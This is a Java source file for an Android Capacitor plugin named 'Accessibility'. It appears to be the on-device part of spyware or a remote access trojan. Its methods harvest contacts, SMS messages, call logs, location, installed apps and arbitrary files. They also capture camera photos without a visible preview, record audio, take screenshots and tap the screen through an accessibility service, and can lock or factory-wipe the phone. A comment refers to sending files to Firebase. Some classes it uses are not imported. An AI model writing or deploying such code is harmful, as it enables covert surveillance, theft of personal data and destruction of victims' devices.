package io.ionic.starter;

import com.getcapacitor.JSObject;
import com.getcapacitor.Plugin;
import com.getcapacitor.PluginCall;
import com.getcapacitor.PluginMethod;
import com.getcapacitor.annotation.CapacitorPlugin;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.location.Location;
import android.location.LocationManager;
import android.content.Context;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.util.Base64;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.view.accessibility.AccessibilityService;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.os.Environment;
import java.nio.ByteBuffer;
import java.util.concurrent.Executor;
import android.net.Uri;
import java.util.ArrayList;
import java.util.List;

@CapacitorPlugin(name = "Accessibility")
public class AccessibilityPlugin extends Plugin {

    @PluginMethod
    public void getContacts(PluginCall call) {
        List<JSObject> contacts = new ArrayList<>();
        ContentResolver cr = getContext().getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                
                JSObject contact = new JSObject();
                contact.put("id", id);
                contact.put("name", name);
                contacts.add(contact);
            }
        }
        if (cur != null) cur.close();

        JSObject ret = new JSObject();
        ret.put("contacts", contacts);
        call.resolve(ret);
    }

    @PluginMethod
    public void getSMS(PluginCall call) {
        List<JSObject> smsList = new ArrayList<>();
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = getContext().getContentResolver().query(uri, null, null, null, null);

        if (cursor != null && cursor.moveToFirst()) {
            for (int i = 0; i < cursor.getCount(); i++) {
                JSObject sms = new JSObject();
                sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                smsList.add(sms);
                cursor.moveToNext();
            }
        }
        if (cursor != null) cursor.close();

        JSObject ret = new JSObject();
        ret.put("sms", smsList);
        call.resolve(ret);
    }

    @PluginMethod
    public void clickAt(PluginCall call) {
        Integer x = call.getInt("x");
        Integer y = call.getInt("y");

        if (x == null || y == null) {
            call.reject("Must provide x and y coordinates");
            return;
        }

        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service != null) {
            service.clickAt(x, y);
            JSObject ret = new JSObject();
            ret.put("success", true);
            call.resolve(ret);
        } else {
            call.reject("Accessibility Service is not connected. Please enable it in settings.");
        }
    }

    @PluginMethod
    public void getCallLogs(PluginCall call) {
        List<JSObject> logs = new ArrayList<>();
        Cursor cursor = getContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
        
        if (cursor != null && cursor.moveToFirst()) {
            do {
                JSObject log = new JSObject();
                log.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                log.put("type", cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                log.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                log.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                logs.add(log);
            } while (cursor.moveToNext());
            cursor.close();
        }
        
        JSObject ret = new JSObject();
        ret.put("call_logs", logs);
        call.resolve(ret);
    }

    @PluginMethod
    public void getLocation(PluginCall call) {
        try {
            LocationManager locationManager = (LocationManager) getContext().getSystemService(Context.LOCATION_SERVICE);
            Location location = null;
            
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }
            
            if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }

            if (location != null) {
                JSObject ret = new JSObject();
                ret.put("latitude", location.getLatitude());
                ret.put("longitude", location.getLongitude());
                ret.put("accuracy", location.getAccuracy());
                ret.put("timestamp", location.getTime());
                call.resolve(ret);
            } else {
                call.reject("Location not available");
            }
        } catch (SecurityException e) {
            call.reject("Location permission denied");
        } catch (Exception e) {
            call.reject("Error getting location: " + e.getMessage());
        }
    }

    @PluginMethod
    public void takePicture(PluginCall call) {
        int cameraId = call.getInt("cameraId", 0); // 0 for back, 1 for front
        new Thread(() -> {
            try {
                Camera camera = Camera.open(cameraId);
                SurfaceTexture st = new SurfaceTexture(0);
                camera.setPreviewTexture(st);
                camera.startPreview();
                
                camera.takePicture(null, null, (data, cam) -> {
                    Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                    Bitmap scaledBitmap = Bitmap.createScaledBitmap(bitmap, 640, 480, true);
                    
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    scaledBitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                    byte[] bytes = baos.toByteArray();
                    String base64Image = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    
                    JSObject ret = new JSObject();
                    ret.put("image", base64Image);
                    call.resolve(ret);
                    
                    cam.stopPreview();
                    cam.release();
                });
            } catch (Exception e) {
                call.reject("Failed to take picture: " + e.getMessage());
            }
        }).start();
    }

    private MediaRecorder recorder;
    private String audioPath;

    @PluginMethod
    public void startRecording(PluginCall call) {
        try {
            audioPath = getContext().getExternalCacheDir().getAbsolutePath() + "/audio_record.3gp";
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioPath);
            recorder.prepare();
            recorder.start();
            call.resolve();
        } catch (Exception e) {
            call.reject("Failed to start recording: " + e.getMessage());
        }
    }

    @PluginMethod
    public void stopRecording(PluginCall call) {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
                
                // অডিও ফাইলকে base64-এ কনভার্ট করা
                File file = new File(audioPath);
                byte[] bytes = new byte[(int) file.length()];
                java.io.FileInputStream fis = new java.io.FileInputStream(file);
                fis.read(bytes);
                fis.close();
                String base64Audio = Base64.encodeToString(bytes, Base64.DEFAULT);
                
                JSObject ret = new JSObject();
                ret.put("audio", base64Audio);
                call.resolve(ret);
                file.delete(); // ক্লিনআপ
            } else {
                call.reject("No recording in progress");
            }
        } catch (Exception e) {
            call.reject("Failed to stop recording: " + e.getMessage());
        }
    }

    @PluginMethod
    public void listFiles(PluginCall call) {
        String path = call.getString("path", Environment.getExternalStorageDirectory().getAbsolutePath());
        File directory = new File(path);
        File[] files = directory.listFiles();
        JSArray fileList = new JSArray();

        if (files != null) {
            for (File file : files) {
                JSObject fileInfo = new JSObject();
                fileInfo.put("name", file.getName());
                fileInfo.put("path", file.getAbsolutePath());
                fileInfo.put("is_dir", file.isDirectory());
                fileInfo.put("size", file.length());
                fileList.put(fileInfo);
            }
        }
        JSObject ret = new JSObject();
        ret.put("files", fileList);
        call.resolve(ret);
    }

    @PluginMethod
    public void getFile(PluginCall call) {
        String path = call.getString("path");
        if (path == null) {
            call.reject("Path is required");
            return;
        }
        try {
            File file = new File(path);
            if (!file.exists() || file.isDirectory()) {
                call.reject("File not found or is a directory");
                return;
            }
            // ফাইল সাইজ চেক করা (খুব বড় ফাইল Firebase-এ পাঠানো যাবে না)
            if (file.length() > 5 * 1024 * 1024) { // 5MB limit
                call.reject("File is too large (>5MB)");
                return;
            }

            byte[] bytes = new byte[(int) file.length()];
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            fis.read(bytes);
            fis.close();
            String base64File = Base64.encodeToString(bytes, Base64.DEFAULT);

            JSObject ret = new JSObject();
            ret.put("data", base64File);
            ret.put("name", file.getName());
            call.resolve(ret);
        } catch (Exception e) {
            call.reject("Failed to read file: " + e.getMessage());
        }
    }

    @PluginMethod
    public void lockPhone(PluginCall call) {
        DevicePolicyManager dpm = (DevicePolicyManager) getContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminName = new ComponentName(getContext(), MyDeviceAdminReceiver.class);
        
        if (dpm.isAdminActive(adminName)) {
            dpm.lockNow();
            call.resolve();
        } else {
            call.reject("Device Admin not active");
        }
    }

    @PluginMethod
    public void wipeData(PluginCall call) {
        DevicePolicyManager dpm = (DevicePolicyManager) getContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminName = new ComponentName(getContext(), MyDeviceAdminReceiver.class);
        
        if (dpm.isAdminActive(adminName)) {
            dpm.wipeData(0);
            call.resolve();
        } else {
            call.reject("Device Admin not active");
        }
    }

    @PluginMethod
    public void getInstalledApps(PluginCall call) {
        PackageManager pm = getContext().getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        JSArray appList = new JSArray();

        for (ApplicationInfo app : apps) {
            JSObject appInfo = new JSObject();
            appInfo.put("name", pm.getApplicationLabel(app).toString());
            appInfo.put("package", app.packageName);
            appInfo.put("is_system", (app.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
            appList.put(appInfo);
        }

        JSObject ret = new JSObject();
        ret.put("apps", appList);
        call.resolve(ret);
    }

    @PluginMethod
    public void takeScreenshot(PluginCall call) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            MyAccessibilityService service = MyAccessibilityService.getInstance();
            if (service != null) {
                service.takeScreenshot(android.view.Display.DEFAULT_DISPLAY, getContext().getMainExecutor(), new AccessibilityService.TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(AccessibilityService.ScreenshotResult screenshotResult) {
                        Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshotResult.getHardwareBuffer(), screenshotResult.getColorSpace());
                        if (bitmap != null) {
                            // ইমেজ সাইজ কমানো
                            Bitmap scaledBitmap = Bitmap.createScaledBitmap(bitmap, 640, 1280, true);
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            scaledBitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                            byte[] bytes = baos.toByteArray();
                            String base64Image = Base64.encodeToString(bytes, Base64.DEFAULT);

                            JSObject ret = new JSObject();
                            ret.put("image", base64Image);
                            call.resolve(ret);
                        } else {
                            call.reject("Failed to capture screenshot bitmap");
                        }
                    }

                    @Override
                    public void onFailure(int errorCode) {
                        call.reject("Screenshot failed with error code: " + errorCode);
                    }
                });
            } else {
                call.reject("Accessibility Service not connected");
            }
        } else {
            call.reject("Screenshot requires Android 11+");
        }
    }
}
